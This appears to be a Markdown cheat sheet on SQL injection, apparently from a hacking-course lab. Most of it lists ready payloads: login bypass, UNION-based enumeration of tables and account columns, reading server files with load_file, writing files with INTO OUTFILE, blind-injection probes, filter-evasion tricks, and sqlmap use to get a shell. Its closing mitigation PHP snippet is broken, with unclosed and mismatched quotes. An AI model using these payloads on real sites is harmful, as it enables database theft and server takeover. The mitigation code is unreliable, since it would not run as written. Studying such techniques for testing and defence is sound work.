* Try to login using SQL statements or symbols (eg. **'** or **%27**)
* Comment the rest of the query using **#** , **%23** , **--** , **/*** , **//** 
* If you think there is some kind of client side filtering, use Burp Proxy
* To read database information:
  * **Order By _n_** - Iterate over **n** to find out the number of columns in table
  * **Union Select 1,2,3,...,n** - Allows you to check which columns are getting displayed by the site
  * **database()** - Name of the database
  * **user()** - User of the server
  * **version()** - OS version of the server
  * **load_file('_path_')** - Load local file
  * **Union Select null, _code_, null Into Outfile '_filePath_'** - Write into file (useful with local file vuln)
  * **Union Select 1, table_name, null, null, 5 From information_schema.tables** - Name of all the tables in the SQL
  * **Union Select 1, table_name, null, null, 5 From information_schema.tables Where table_schema = "owasp10"** - Name of all the tables in owasp10 database
  * **Union Select 1, column_name, null, null, 5 From information_schema.columns Where table_name = "accounts"** - Name of all the columns in accounts table
  * If site doesnt iterate through all results from the query use **limit**:
    * **Union Select table_name,2 From information_schema.tables Limit 1,2** - Iterate through results 1 by 1.
* Use Burp Decoder to encode query to HEX (0x...)
* Use **+** instead of SPACE
* Use different cases to avoid filters
* In a Blind SQL Injection, try to send a true and false value to see how the page behaves
  * True - **and 1=1** or **order by 1**
  * False - ** and 1=0** or **order by 10000000**

### Auto SQL Injection
* **$ sqlmap -u _"URL"_** - Find SQL injections automatically
* We can get shell with **SQLMap**

### Mitigation
* [Fast way](https://github.com/KevinSantos/Hacking/blob/master/sqlInjectionMitigation.php)
* Best way:
   ```php
   <?php
   $hackerInput = "admin' union select #";

   prepare("SELECT * FROM accounts WHERE username = ?);
   execute(array('admin' union select #');
   ?>
   ```
